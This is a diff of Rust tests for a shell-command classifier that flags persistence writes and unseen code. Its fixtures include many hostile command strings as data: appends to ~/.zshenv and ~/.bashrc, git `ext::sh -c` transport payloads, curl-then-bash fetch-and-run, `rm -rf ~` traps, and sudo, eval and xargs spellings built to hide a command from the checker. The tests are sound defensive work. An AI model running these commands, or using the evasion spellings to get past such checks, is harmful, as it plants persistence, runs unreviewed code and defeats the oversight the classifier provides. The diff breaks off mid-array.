@@ -10,6 +10,38 @@ mod issue_1161_round6;
 #[path = "issue_1309_line_writes_tests.rs"]
 mod issue_1309_line_writes;
 
+#[path = "issue_1704_code_tables_tests.rs"]
+mod issue_1704_code_tables;
+
+#[path = "issue_1276_to_1620_tests.rs"]
+mod issue_1276_to_1620;
+
+/// #1716: the work counter (`super::work`) with tracing silenced while it
+/// counts; it shadows the `work` of `use super::*` for these tests. The
+/// `#[traced_test]` tests in this binary install a process-wide subscriber
+/// that keeps every event of every thread in one shared buffer. Once it is
+/// installed, the classifier's #932 shadow log lands there too, and when
+/// that buffer grows on this thread the allocator counts its whole new
+/// size as this thread's work (about 1.5 MB more at 4x on CI, failing
+/// `issue_988_989_checks_are_linear`; a 1,490,944-byte growth when
+/// reproduced). With no subscriber for this thread the counts are the
+/// classifier's own work again, whatever other tests run.
+mod work {
+    pub(super) use super::super::work::*;
+
+    pub(super) fn measure(run: impl FnOnce()) -> Work {
+        quiet(|| super::super::work::measure(run))
+    }
+
+    pub(super) fn assert_linear(label: &str, run: impl Fn(usize)) {
+        quiet(|| super::super::work::assert_linear(label, run));
+    }
+
+    fn quiet<T>(run: impl FnOnce() -> T) -> T {
+        tracing::subscriber::with_default(tracing::subscriber::NoSubscriber::default(), run)
+    }
+}
+
 const HOME: &str = "/home/fixture/.corbanu";
 const USER_HOME: &str = "/home/fixture";
 
@@ -6509,6 +6541,33 @@ fn issue_988_989_checks_are_linear() {
     }
 }
 
+/// #1716: no subscriber sees the work the counter counts, so a process-wide
+/// one (see `work` above) adds nothing to the counts.
+#[test]
+fn issue_1716_counted_work_reaches_no_subscriber() {
+    let buffer: &'static std::sync::Mutex<Vec<u8>> =
+        Box::leak(Box::new(std::sync::Mutex::new(Vec::new())));
+    let subscriber = tracing_subscriber::fmt()
+        .with_ansi(false)
+        .with_max_level(tracing::Level::TRACE)
+        .with_writer(tracing_test::internal::MockWriter::new(buffer))
+        .finish();
+    let line = |scale: usize| format!("{} echo hi", "${".repeat(400 * scale));
+    let logged = || buffer.lock().expect("log buffer").len();
+    tracing::subscriber::with_default(subscriber, || {
+        let _ = script(&line(1));
+        let uncounted = logged();
+        assert!(uncounted > 0, "the line logs a #932 difference");
+        let _ = work::measure(|| {
+            let _ = script(&line(1));
+        });
+        work::assert_linear("logged line", |scale| {
+            let _ = script(&line(scale));
+        });
+        assert_eq!(logged(), uncounted);
+    });
+}
+
 /// #1309: a `cd` the quote-aware reading follows may not happen (it fails,
 /// runs behind a condition, in a subshell or in a background job), so a
 /// later nested script is judged in every folder the line may be in; past
@@ -6908,6 +6967,217 @@ fn d217_sudo_close_from_names_no_folder() {
     }
 }
 
+/// #1482 review: a cluster letter that is not a known flag may take a value
+/// that holds the rest of the word (`xargs -i`, `systemd-run -E`, `nsenter
+/// -n`, `sudo -R`), so such a cluster is one word, as on main, and the
+/// command after it is judged.
+#[cfg(unix)]
+#[test]
+fn issue_1482_unknown_cluster_letters_keep_one_word() {
+    let evil = "echo x >> ~/.zshenv\n";
+    let words = |line: &str| line.split(' ').map(str::to_string).collect::<Vec<_>>();
+    let lines = [
+        "xargs -iI sh x",
+        "systemd-run --user -dEu sh x",
+        "nsenter -nt sh x",
+        "sudo -Ru sh x",
+    ];
+    for (line, at, name) in [
+        (lines[0], 2, "sh"),
+        (lines[1], 3, "sh"),
+        (lines[2], 2, "sh"),
+        (lines[3], 2, "sh"),
+        // Known flags before a value letter still take its value.
+        ("sudo -iu root sh x", 3, "sh"),
+        ("nsenter -at 1 sh x", 3, "sh"),
+        ("systemd-run -dqp X=1 sh x", 3, "sh"),
+        ("xargs -0I {} sh x", 3, "sh"),
+        ("taskset 0x3 sh x", 2, "sh"),
+        ("taskset -c -a 0 sh x", 4, "sh"),
+    ] {
+        assert_eq!(
+            indirect::command_word(&words(line)),
+            Some((at, name.to_string())),
+            "{line}"
+        );
+    }
+    let quiet: Vec<&str> = lines
+        .into_iter()
+        .filter(|line| in_workspace(&[("x", evil)], line).is_none())
+        .collect();
+    assert_eq!(quiet, Vec::<&str>::new(), "should ask");
+}
+
+/// #1482 items 2-5 ask: a redirection's file, descriptor, `{fd}` name or
+/// here-document delimiter read as the command (`sudo -R >log -C sub
+/// ./run.sh`, `>log ./x`, `2>&1 ./x`, `<<EOF ./x`), also in `eval`'s line,
+/// `eval` text without the wrapper-folder check (`eval 'sudo -C 3
+/// ./run.sh'`), sudo running code the words do not name (`-i` from the
+/// target user's home, `-A` an askpass helper, `-e` an editor), also in
+/// `eval`'s line, and an argv element up to the command that the lexer
+/// reads otherwise (`["true ./x"]`, one file of that name; `["env", "A=1
+/// ./y", "./x"]`). The lines around them stay as they were. Review 1 of
+/// #1719 added the descriptor, `eval`, argv and `-R VALUE` lines.
+#[cfg(unix)]
+#[test]
+fn issue_1482_items_2_to_5_ask() {
+    let evil = "echo x >> ~/.zshenv\n";
+    let x_evil: &[(&str, &str)] = &[("x", evil)];
+    let x_ok: &[(&str, &str)] = &[("x", "true\n")];
+    let sub_evil: &[(&str, &str)] = &[("run.sh", "true\n"), ("sub/run.sh", evil)];
+    let three_evil: &[(&str, &str)] = &[("run.sh", "true\n"), ("3/run.sh", evil)];
+    let mut wrong = Vec::new();
+    for (files, line) in [
+        // Item 2.
+        (sub_evil, "sudo -R >log -C sub ./run.sh"),
+        (x_evil, ">log ./x"),
+        (x_evil, "sudo >log ./x"),
+        (x_evil, "env >log ./x"),
+        (x_evil, "2>log sh x"),
+        (x_evil, "sudo 2>log ./x"),
+        (x_evil, "<log sh x"),
+        (x_evil, "sudo 2>&1 ./x"),
+        (x_evil, "2>&1 ./x"),
+        (x_evil, ">&2 ./x"),
+        (x_evil, "{fd}>log ./x"),
+        (x_evil, "<<EOF ./x"),
+        (x_evil, ">log eval ./x"),
+        // `&>log` is read as `&` and `>log`.
+        (x_evil, "sudo &>log -u root ./x"),
+        (sub_evil, "sudo -R &>log -C sub ./run.sh"),
+        (x_ok, "eval '>log ./x'"),
+        // Item 3.
+        (three_evil, "eval 'sudo -C 3 ./run.sh'"),
+        (three_evil, "eval sudo -C 3 ./run.sh"),
+        (sub_evil, "eval 'sudo -D sub ./run.sh'"),
+        (x_evil, "eval ./x"),
+        // Item 4.
+        (x_ok, "sudo -i ./x"),
+        (x_ok, "sudo -iu root ./x"),
+        (x_ok, "sudo -A ./x"),
+        (x_ok, "sudo -nA ./x"),
+        (x_ok, "sudo --askpass ./x"),
+        (x_ok, "sudo -e ./x"),
+        (x_ok, "sudo -u root -e ./x"),
+        (x_ok, "sudo --edit ./x"),
+        (x_ok, "sudoedit ./x"),
+        (x_ok, "eval sudo -A ./x"),
+        (x_ok, "eval sudoedit ./x"),
+        (x_ok, "sudo -R sub -A ./x"),
+        (x_ok, "sudo --user root --askpass ./x"),
+        // Review 2: a redirection before or among sudo's options.
+        (x_ok, ">log sudo -A true"),
+        (x_ok, "2>/dev/null sudo -A true"),
+        (x_ok, "sudo >log -A true"),
+        (x_ok, "sudo 2>&1 -A true"),
+        (x_ok, "sudo {fd}>log -e f"),
+        (x_ok, ">log sudoedit f"),
+        // Review 2: each sudo's options are read as before, past the next
+        // program the wrapper reading sees (`env`, the `-R` value).
+        (x_ok, "sudo -R env -A true"),
+        (x_ok, "sudo -R sudo -A true"),
+        (x_ok, "sudo --us root -A true"),
+    ] {
+        if in_workspace(files, line).is_none() {
+            wrong.push(line);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new(), "should ask");
+    for (files, line) in [
+        (x_ok, "ls >log"),
+        (x_ok, "ls 2>/dev/null"),
+        (x_ok, "2>/dev/null ls"),
+        (x_ok, "exec >log"),
+        (x_ok, "exec 3>&1"),
+        (x_ok, "cat <<EOF"),
+        (x_ok, "ls 2>&1"),
+        (x_ok, "ls >&2"),
+        (x_ok, "sudo ./x >log"),
+        (x_ok, "sudo ./x 2>&1"),
+        (x_ok, "sudo --user root ./x"),
+        (x_ok, "eval sudo ./x"),
+        (x_ok, "eval ./x"),
+        (x_ok, "eval true"),
+        (x_ok, "sudo -u root ./x"),
+        (x_ok, "sudo -E ./x"),
+        (x_ok, "sudo -u e ./x"),
+        (x_ok, "sudo -p A ./x"),
+        // #1309: `-s` runs `$SHELL`, read as before.
+        (x_ok, "sudo -s ./x"),
+        (x_ok, ">log sudo true"),
+        (x_ok, "sudo 2>&1 -u root true"),
+        // D217: sudo's own `-C N` names no folder.
+        (three_evil, "sudo -C 3 ./run.sh"),
+    ] {
+        if in_workspace(files, line).is_some() {
+            wrong.push(line);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new(), "should be quiet");
+    // Item 5: each argv element is one word.
+    let root = tempfile::tempdir().expect("tempdir");
+    std::fs::write(root.path().join("x"), "true\n").expect("x");
+    let cwd = root.path().to_string_lossy().into_owned();
+    let argv = |command: &[&str]| {
+        classify_with(&shell_in(&cwd, command), &fixture(HOME), Some(root.path()))
+    };
+    let mut wrong = Vec::new();
+    for command in [
+        &["true ./x"][..],
+        &["env", "true ./x"],
+        &["sudo", "-u", "root", "true ./x"],
+        &["true;./x"],
+        &["env", "A=1 ./y", "./x"],
+        &["sudo", "-u", "root ./y", "./x"],
+        &["./{x,y}"],
+        &["true`./x`"],
+    ] {
+        if argv(command).is_none() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&[&str]>::new(), "should ask");
+    for command in [
+        &["true", "./x"][..],
+        &["./x"],
+        &["echo", "a b"],
+        &["bash", "-lc", "true ./x"],
+        &["sudo", "sh", "-c", "true ./x"],
+        &["env", "A=1", "./x"],
+        &["sudo", "-u", "root", "./x"],
+        &["./x", "a b", "{c,d}"],
+        &["xargs", "-I{}", "rm", "--", "{}"],
+    ] {
+        if argv(command).is_some() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&[&str]>::new(), "should be quiet");
+}
+
+/// #1482 items 2-5 (reviews 1 and 2 of #1719): the redirection and sudo
+/// option checks stay linear in the line's length, also for chained sudos
+/// whose option reading runs past the next sudo (`-R`, `--us`, `-xu`).
+#[test]
+fn issue_1482_items_2_to_5_checks_are_linear() {
+    for (label, unit) in [
+        ("redirections", ">a "),
+        ("descriptors", "2>&1 "),
+        ("sudo options", "-u root "),
+        ("sudo clusters", "-nu root "),
+        ("chained sudo -R", "sudo -R "),
+        ("chained sudo --us", "sudo --us "),
+        ("chained sudo -xu", "sudo -xu "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let units = unit.repeat(400 * scale);
+            let _ = script(&format!("sudo {units}./x"));
+            let _ = script(&format!("{units}./x"));
+            let _ = script(&format!("eval sudo {units}./x"));
+        });
+    }
+}
+
 /// #1302 follow-up: programs named by a path, behind a wrapper's folder,
 /// are judged in linear work.
 #[cfg(unix)]
@@ -7083,6 +7353,55 @@ fn issue_1159_code_variables_and_git_programs_are_unseen_code() {
         "git push origin main",
         "git init",
         "ls -la",
+    ] {
+        if script(command).is_some() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new());
+}
+
+/// Git's `ext::` smart transport runs an arbitrary command as the remote
+/// helper (`git fetch ext::sh -c id` runs `sh -c id`), which the host cannot
+/// read before it runs. Git refuses `ext` by default, but config the
+/// classifier cannot see may allow it, so a remote naming it asks like git's
+/// other program-running forms, also as a long option's `=` value
+/// (`git archive --remote=ext::…`).
+#[test]
+fn git_ext_transport_remote_is_unseen_code() {
+    use ProtectedActionKind::UnseenCode;
+    let mut wrong = Vec::new();
+    for command in [
+        "git fetch ext::sh -c id",
+        "git pull ext::sh -c id",
+        "git ls-remote ext::sh -c id",
+        "git remote add o ext::sh -c id",
+        "git fetch 'ext::sh -c \"touch pwned\"'",
+        "git -C sub fetch ext::sh -c id",
+        "git fetch EXT::sh -c id",
+        "git archive --remote=ext::sh -c id HEAD",
+        "git archive --rem=ext::sh -c id HEAD",
+        "git push --repo=ext::sh -c id",
+        "git clone ext::sh -c id",
+        "git submodule add ext::sh -c id",
+        "git remote set-url o ext::sh -c id",
+        "git-fetch ext::sh -c id",
+        "sudo git fetch ext::sh -c id",
+    ] {
+        if script(command) != Some(UnseenCode) {
+            wrong.push(command);
+        }
+    }
+    // A git command with an ordinary remote or no remote stays quiet.
+    for command in [
+        "git fetch origin",
+        "git pull origin main",
+        "git ls-remote https://x.example/r",
+        "git fetch git://x.example/r",
+        "git remote add o https://x.example/r",
+        "git archive --remote=origin HEAD",
+        "git fetch git@host:ext::x",
+        "git grep 'crate::ext::Foo'",
     ] {
         if script(command).is_some() {
             wrong.push(command);
@@ -8524,10 +8843,15 @@ fn d191_other_mktemp_spellings_still_ask() {
             Persistence,
         ),
         ("_=$(mktemp); : ~/.bashrc; echo evil >> \"$_\"", Persistence),
-        ("_=$(mktemp -d); trap 'rm -rf \"$_\"' EXIT; : ~", UnseenCode),
+        // #1685: these ask as Persistence now: trap's quoted action and
+        // the variables `eval` text sets are judged.
+        (
+            "_=$(mktemp -d); trap 'rm -rf \"$_\"' EXIT; : ~",
+            Persistence,
+        ),
         (
             "DIRSTACK=$(mktemp -d); trap 'rm -rf \"$DIRSTACK\"' EXIT",
-            UnseenCode,
+            Persistence,
         ),
         ("TMP=$(mktemp); echo x > \"$TMP\"", Persistence),
         (
@@ -8536,16 +8860,20 @@ fn d191_other_mktemp_spellings_still_ask() {
         ),
         (
             "tmp=$(mktemp); cd ~ && trap 'rm -rf \"$tmp\" LIBRARY DOCUMENTS' EXIT",
-            UnseenCode,
+            // #1685: the trap's `rm` removes a protected home file.
+            Persistence,
         ),
-        ("tmp=$(mktemp); trap 'rm -rf \"$tmp\" ~/x' EXIT", UnseenCode),
+        (
+            "tmp=$(mktemp); trap 'rm -rf \"$tmp\" ~/x' EXIT",
+            Persistence,
+        ),
         (
             "tmp=$(mktemp); trap 'rm -rf \"$tmp\"' EXIT; trap 'rm -rf ~' INT",
-            UnseenCode,
+            Persistence,
         ),
         (
             "tmp=$(mktemp); t\"\"rap 'rm -rf \"$tmp\" x' EXIT",
-            UnseenCode,
+            Persistence,
         ),
         (
             "tmp=$(mktemp); xargs mv ./link <<< \"$tmp\"; echo x >> \"$tmp\"",
@@ -8656,8 +8984,8 @@ fn d191_other_mktemp_spellings_still_ask() {
         ),
         ("tmp=$(mktemp) | cat; echo > \"$tmp\"", Persistence),
         ("tmp=$(mktemp) & echo > \"$tmp\"", Persistence),
-        ("eval 'tmp=$(mktemp)'; echo > \"$tmp\"", UnseenCode),
-        ("eval \"tmp=$(mktemp)\"; echo > \"$tmp\"", UnseenCode),
+        ("eval 'tmp=$(mktemp)'; echo > \"$tmp\"", Persistence),
+        ("eval \"tmp=$(mktemp)\"; echo > \"$tmp\"", Persistence),
         ("tmp=$(mktemp); eval 'echo > \"$tmp\"'", Persistence),
         ("tmp=$(mktemp); eval \"rm -f $tmp\"", UnseenCode),
         ("bash -c 'tmp=$(mktemp); echo > \"$tmp\"'", Persistence),
@@ -8731,7 +9059,8 @@ fn d191_other_mktemp_spellings_still_ask() {
         ("tmp=$(mktemp); trap \"sh $tmp\" EXIT", UnseenCode),
         (
             "tmp=$(mktemp); trap \"rm -f $tmp ~/.zshrc\" EXIT",
-            UnseenCode,
+            // #1685: the trap's `rm` removes a protected home file.
+            Persistence,
         ),
         (
             "tmp=$(mktemp); curl -so \"$tmp\" https://x.example; bash \"$tmp\"",
@@ -8816,6 +9145,34 @@ fn issue_1132_many_short_saved_targets_are_linear() {
         let line = format!("echo{calls} | tee {names}");
         assert_eq!(script(&line), None);
     });
+}
+
+/// #1132: an unsafe or over-limit output list becomes one unknown target, so
+/// a harmless known list stays quiet but an unknown destination is rejected
+/// when the line runs a script. On Windows, script reads do not follow these
+/// redirections, so the unsafe cases ask for that reason; Unix checks the bound.
+#[test]
+fn issue_1132_unsafe_or_oversized_saved_targets_are_unseen_code() {
+    let (_dir, cwd) = issue_885_fixture();
+    let classify =
+        |script: String| classify_fixture(&shell_in(&cwd, &[SCRIPT_BASH, "-c", &script]));
+
+    assert_eq!(
+        classify(format!("sed p{}; bash r.sh", " >a".repeat(64))),
+        unfollowed(/*expected*/ None)
+    );
+    assert_eq!(
+        classify(format!("sed p{}; bash r.sh", " >a".repeat(65))),
+        Some(ProtectedActionKind::UnseenCode)
+    );
+    assert_eq!(
+        classify("sed p >x.sh; bash r.sh".to_string()),
+        unfollowed(/*expected*/ None)
+    );
+    assert_eq!(
+        classify("sed p >*.sh; bash r.sh".to_string()),
+        Some(ProtectedActionKind::UnseenCode)
+    );
 }
 
 /// Sharing target judgement must keep both known and unknown destinations
@@ -10683,817 +11040,6 @@ fn issue_1276_launcher_input_as_program_or_code_asks() {
     }
 }
 
-/// #1276: reading launchers stays linear, and a line with more launchers
-/// than are read asks.
-#[test]
-fn issue_1276_launcher_input_checks_are_linear() {
-    for (label, prefix, unit, suffix) in [
-        ("exec options", "find . ", "-exec echo {} + ", ""),
-        ("words", "xargs -I% echo ", "% ", ""),
-        ("long replacement", "xargs -I", "%", " echo x"),
-        ("options", "xargs ", "-n1 -P2 --zz ", "echo"),
-        ("parallel options", "parallel ", "--zz x -j4 ", "gzip ::: a"),
-        ("rush flags", "rush ", "-j 2 -v a=b ", "'echo {}'"),
-        ("script", "xargs -I% sh -c '", "echo % x; ", "'"),
-        ("positional", "xargs sh -c '", "echo \"$1\"; ", "' _"),
-        ("substitutions", "xargs -I% sh -c 'echo ", "$(echo ", "%'"),
-        ("env strings", "xargs -I% env ", "-S'echo %' ", ""),
-        (
-            "find env strings",
-            "find . -exec env ",
-            "-S'echo {}' ",
-            "\\;",
-        ),
-        (
-            "parallel readings",
-            "parallel ",
-            "--zz x --yy ",
-            "'{} x' ::: a",
-        ),
-        (
-            "loops",
-            "xargs sh -c '",
-            "for f; do echo \"$f\"; done; ",
-            "' _",
-        ),
-    ] {
-        work::assert_linear(label, |scale| {
-            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
-            let _ = script(&line);
-        });
-    }
-    let line = format!("echo {}", "fd ".repeat(17));
-    assert_eq!(script(&line), Some(ProtectedActionKind::UnseenCode));
-    let line = format!("echo {}", "fd ".repeat(16));
-    assert_eq!(script(&line), None);
-}
-
-/// #1276 items 8 to 10 (tmux and other line runners under a launcher, fish
-/// `-C`, shell options that take a value before `-c`) already ask on main;
-/// kept as regressions.
-#[test]
-fn issue_1276_line_runners_and_shell_options_ask() {
-    for command in [
-        "xargs -I% tmux new 'cd .; git config %' < f",
-        "xargs -I% tmux new-session -d 'git config %' < f",
-        "xargs -I% tmux run-shell 'git config %' < f",
-        "tmux new 'git config core.pager sh'",
-        "xargs -I% watch 'git config %' < f",
-        "fish -C 'git config core.pager sh'",
-        "fish -c true -C 'git config core.pager sh'",
-        "fish --init-command 'git config core.pager sh'",
-        "fish --init-command='git config core.pager sh'",
-        "xargs -I% zsh --emulate sh -c 'git config %' < f",
-        "xargs -I% ksh93 -R file -c 'git config %' < f",
-        "xargs -I% mksh -T tty -c 'git config %' < f",
-        "zsh --emulate sh -c 'git config core.pager sh'",
-        "mksh -T tty -c 'git config core.pager sh'",
-    ] {
-        assert!(script(command).is_some(), "{command}");
-    }
-}
-
-/// #1276 item 3: a `git config` word holding a value the classifier cannot
-/// see outside double quotes may be several words, as `"$@"` may: it asks
-/// as a write unless the visible words make it a read. So does such a
-/// value as the first word, which may be an option (`-e`).
-#[test]
-fn issue_1276_git_config_unseen_words_ask() {
-    for command in [
-        "x=$(cat f); git config $x",
-        "git config $X",
-        "git config \"$k\"",
-        "git config user.name $NAME",
-        "k=$(curl -s https://x.example); git config $k",
-    ] {
-        assert_eq!(
-            script(command),
-            Some(ProtectedActionKind::Persistence),
-            "{command}"
-        );
-    }
-    for command in [
-        "git config --get \"$k\"",
-        "git config --get $k",
-        "git config user.name \"$NAME\"",
-        "git config --get-regexp \"$pat\"",
-        "git config user.email \"$(git log -1 --format=%ae)\"",
-        "for k in a b; do git config --get \"$k\"; done",
-    ] {
-        assert_eq!(script(command), None, "{command}");
-    }
-}
-
-/// #1309: more ways a nested script's folder becomes one the quote-aware
-/// reading cannot know (from the #1310 review list): login spellings of
-/// wrappers, which start in the target user's home; programs that start
-/// elsewhere unless told to keep the folder; folder options of more
-/// wrappers; a command word spelled as a pattern; a `cd` behind zsh's
-/// precommand modifiers; and commands that load or switch builtins or
-/// rerun history. A relative write in such a script asks. All were quiet
-/// on main.
-#[test]
-fn issue_1309_login_wrappers_patterns_and_loaders_ask() {
-    for command in [
-        "sudo -i sh -c 'echo x >> .zshenv'",
-        "sudo -u me -i sh -c 'echo x >> .zshenv'",
-        "sudo --login sh -c 'echo x >> .zshenv'",
-        "sudo --log sh -c 'echo x >> .zshenv'",
-        "su - -c \"sh -c 'echo x >> .zshenv'\"",
-        "su - -c 'echo x >> .zshenv'",
-        "su -l me -c \"sh -c 'echo x >> .zshenv'\"",
-        "su --login -c \"sh -c 'echo x >> .zshenv'\"",
-        "su --l -c \"sh -c 'echo x >> .zshenv'\"",
-        "runuser -l me -c \"sh -c 'echo x >> .zshenv'\"",
-        "runuser - me -c \"sh -c 'echo x >> .zshenv'\"",
-        "machinectl shell me@ /bin/sh -c 'echo x >> .zshenv'",
-        "systemd-run --user sh -c 'echo x >> .zshenv'",
-        "systemd-run sh -c 'echo x >> home/fixture/.zshenv'",
-        "systemd-run --unit x sh -c 'echo x >> .zshenv'",
-        "pkexec --user me sh -c 'echo x >> .zshenv'",
-        "schroot -d ~ -- sh -c 'echo x >> .zshenv'",
-        "apptainer exec --pwd ~ img sh -c 'echo x >> .zshenv'",
-        "singularity exec --pwd ~ img sh -c 'echo x >> .zshenv'",
-        "buildah run --workingdir ~ c sh -c 'echo x >> .zshenv'",
-        "touch cd; c? ~; sh -c 'echo x >> .zshenv'",
-        "[c]d ~; sh -c 'echo x >> .zshenv'",
-        "{c,}d ~; sh -c 'echo x >> .zshenv'",
-        "{c..c}d ~; sh -c 'echo x >> .zshenv'",
-        "for i in 1 2; do sh -c 'echo x >> .zshenv'; [c]d ~; done",
-        "f() { sh -c 'echo x >> .zshenv'; }; [c]d ~; f",
-        "noglob cd ~; sh -c 'echo x >> .zshenv'",
-        "nocorrect cd ~; sh -c 'echo x >> .zshenv'",
-        "- cd ~; sh -c 'echo x >> .zshenv'",
-        "noglob nocorrect cd ~; sh -c 'echo x >> .zshenv'",
-        "zmodload zsh/x; sh -c 'echo x >> .zshenv'",
-        "enable -f ./x.so cd; cd /tmp; sh -c 'echo x >> .zshenv'",
-        "enable -n cd; cd /tmp; sh -c 'echo x >> .zshenv'",
-        "disable cd; cd /tmp; sh -c 'echo x >> .zshenv'",
-        "fc -e 'sed -i s/a/b/'; sh -c 'echo x >> .zshenv'",
-        "fc -l -s; sh -c 'echo x >> .zshenv'",
-        "fc -ls; sh -c 'echo x >> .zshenv'",
-        "r; sh -c 'echo x >> .zshenv'",
-        // Review 2: a keep option after the program is the program's;
-        // run0; other commands behind a modifier.
-        "pkexec sh -c 'echo x >> .zshenv' --keep-cwd",
-        "systemd-run sh -c 'echo x >> home/fixture/.zshenv' -d",
-        "systemd-run -u x sh -c 'echo x >> .zshenv' --scope",
-        "run0 -u me sh -c 'echo x >> .zshenv'",
-        "noglob builtin cd ~; sh -c 'echo x >> .zshenv'",
-        "noglob command cd ~; sh -c 'echo x >> .zshenv'",
-        "noglob eval 'cd ~'; sh -c 'echo x >> .zshenv'",
-        "noglob source ./f; sh -c 'echo x >> .zshenv'",
-        "noglob enable -n cd; cd /tmp; sh -c 'echo x >> .zshenv'",
-        "noglob fc -s; sh -c 'echo x >> .zshenv'",
-    ] {
-        assert_eq!(
-            script(command),
-            Some(ProtectedActionKind::Persistence),
-            "{command}"
-        );
-    }
-    for command in [
-        "sudo -u me sh -c 'echo x > out.txt'",
-        "sudo -s sh -c 'echo x > out.txt'",
-        "su me -c \"sh -c 'echo x > out.txt'\"",
-        "systemd-run --scope sh -c 'echo x > out.txt'",
-        "systemd-run --user --same-dir sh -c 'echo x > out.txt'",
-        "pkexec --keep-cwd sh -c 'echo x > out.txt'",
-        "pkexec --user me --keep-cwd sh -c 'echo x > out.txt'",
-        "systemd-run -u x -p Nice=5 --scope sh -c 'echo x > out.txt'",
-        "noglob builtin echo; sh -c 'echo x > out.txt'",
-        "[ -d build ] || mkdir build; sh -c 'echo x > out.txt'",
-        "[[ -n x ]] && sh -c 'echo x > out.txt'",
-        "f() { :; }; f; sh -c 'echo x > out.txt'",
-        "fc -l; sh -c 'echo x > out.txt'",
-        "noglob ls *.txt; sh -c 'echo x > out.txt'",
-    ] {
-        assert_eq!(script(command), None, "{command}");
-    }
-    // Asked on main too; kept as regressions (a function or alias named
-    // like a modifier is still the command).
-    for command in [
-        "sudo -i sh -c 'git config -f .zshenv --comment x,--get a.b v'",
-        "noglob() { echo $(( $1 )); }; noglob 'a[$(touch ~/.zshrc)]'",
-    ] {
-        assert!(script(command).is_some(), "{command}");
-    }
-}
-
-/// #1309: the login, keep-option, modifier and pattern checks stay linear.
-#[test]
-fn issue_1309_login_and_modifier_checks_are_linear() {
-    for (label, unit, suffix) in [
-        ("keep options", "pkexec ", "--keep-cwd sh -c 'echo x'"),
-        ("valued options", "systemd-run -u ", "sh -c 'echo x'"),
-        ("logins", "sudo -i su - ", "sh -c 'echo x'"),
-        ("modifiers", "noglob nocorrect ", "cd /b; sh -c 'echo x'"),
-        ("patterns", "c?; [c]d; ", "sh -c 'echo x'"),
-        ("fc", "fc -l -l ", "; sh -c 'echo x'"),
-    ] {
-        work::assert_linear(label, |scale| {
-            let line = format!("{}{suffix}", unit.repeat(200 * scale));
-            let _ = script(&line);
-        });
-    }
-}
-
-/// #1276 follow-ups from the #1517 review: a launcher in text `eval` or
-/// `trap` runs, an `S` in another env option's value, a bundled `parallel
-/// -kI@`, xargs options after an unknown option's value, rush `-Q`, and a
-/// program after a wrapper's `--`. Each line was quiet on main.
-#[test]
-fn issue_1276_follow_ups_ask() {
-    for command in [
-        // `eval`/`trap` text without quotes of its own.
-        "eval 'xargs env < f'",
-        "eval \"parallel < cmds\"",
-        "eval xargs env < f",
-        "eval eval 'xargs env < f'",
-        "eval 'true; xjobs < cmds'",
-        "nice eval 'xargs env < f'",
-        "trap 'xargs sh -c' EXIT",
-        "trap 'parallel < cmds' EXIT",
-        "trap -- 'xargs env < f' EXIT",
-        "sh -c \"eval 'parallel < f'\"",
-        // Review 1: `eval --`, `command eval`, quoted `eval` in `trap` text.
-        "eval -- 'xargs env < f'",
-        "eval command eval xargs env < f",
-        "eval builtin eval xargs env < f",
-        "eval \"eval -- 'xargs env < f'\"",
-        "trap \"eval 'xargs env < f'\" EXIT",
-        "trap \"trap 'xargs env < f' INT\" EXIT",
-        // An `S` in another env option's value is no split.
-        "xargs -I% env -uSSH_AUTH_SOCK python3 -c 'print(%)' < f",
-        "xargs -I% env -CSrc sh -c '% x' < f",
-        // `-I` bundled after other letters.
-        "parallel -kI@ 'python3 -c \"print(@)\"' ::: a",
-        "parallel -j2 -kI@ '@ x' ::: a",
-        // xargs' options read on after an unknown option's value.
-        "xargs --frob x -I% % config < f",
-        "xargs -0 --frob x -I% % config < f",
-        "xargs --frob x --replace=R R < f",
-        "xargs --frob x --frob y -I% % < f",
-        // rush's `-Q`/`--escape-symbols` take a value.
-        "rush -Q x '{}' < f",
-        "rush -Q x 'python3 -c \"print({})\"' < f",
-        "rush --escape-symbols x '{}' < f",
-        "rush -kQ x '{}' < f",
-        // A program after a wrapper's operands and `--` (GNU tools run a
-        // program named `--`; one that reads options after operands runs
-        // the words after it).
-        "xargs -I% flock l -- % < f",
-        "xargs -I% flock -w 5 l -- % config < f",
-        "xargs -I% timeout 5 -- % < f",
-        "xargs -I% flock l -- python3 -c 'print(%)' < f",
-        "xargs flock l -- < f",
-        r"find . -exec flock l -- {} \;",
-    ] {
-        assert_eq!(
-            script(command),
-            Some(ProtectedActionKind::UnseenCode),
-            "{command}"
-        );
-    }
-    for command in [
-        "eval 'echo hi'",
-        "eval \"git status\"",
-        "eval eval eval echo x",
-        "eval -- echo hi",
-        "trap \"eval 'echo bye'\" EXIT",
-        "trap 'echo bye' EXIT",
-        "xargs -I% env -uFOO echo % < f",
-        "xargs -I% env -uSSH_AUTH_SOCK echo % < f",
-        "parallel -kI@ 'echo @' ::: a",
-        "xargs --frob x -I% echo % < f",
-        "rush -Q x 'echo {}' < f",
-        "xargs -I% flock l -- rm % < f",
-        "xargs -I% timeout 5 -- rm -- % < f",
-    ] {
-        assert_eq!(script(command), None, "{command}");
-    }
-}
-
-/// #1276 follow-ups: the new readings stay linear.
-#[test]
-fn issue_1276_follow_up_checks_are_linear() {
-    for (label, prefix, unit, suffix) in [
-        ("eval words", "eval ", "eval ", "echo x"),
-        ("eval ends", "eval ", "eval -- ", "echo x"),
-        ("quoted evals", "trap \"", "eval ", "'echo x'\" EXIT"),
-        ("eval line", "eval '", "echo x; ", "'"),
-        ("trap operands", "trap ", "'echo x' ", "EXIT"),
-        ("xargs readings", "xargs ", "--zz x ", "-I% echo %"),
-        ("rush escapes", "rush ", "-Q x ", "'echo {}'"),
-        ("env groups", "xargs -I% env ", "-uSx ", "echo %"),
-        ("wrapper ends", "xargs -I% ", "flock l -- ", "echo %"),
-    ] {
-        work::assert_linear(label, |scale| {
-            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
-            let _ = script(&line);
-        });
-    }
-}
-
-/// #1159 follow-ups from the #1521 review: a zsh `=word` the command reading
-/// skips as an assignment (`=$X`, `=tee`), and the output files of the
-/// command after a precommand modifier (`noglob git log --output=f`). Each
-/// line was quiet on main.
-#[test]
-fn issue_1159_equals_words_and_modified_outputs_ask() {
-    let unseen = [
-        ("bash", "=$X log --output=~/.zshrc"),
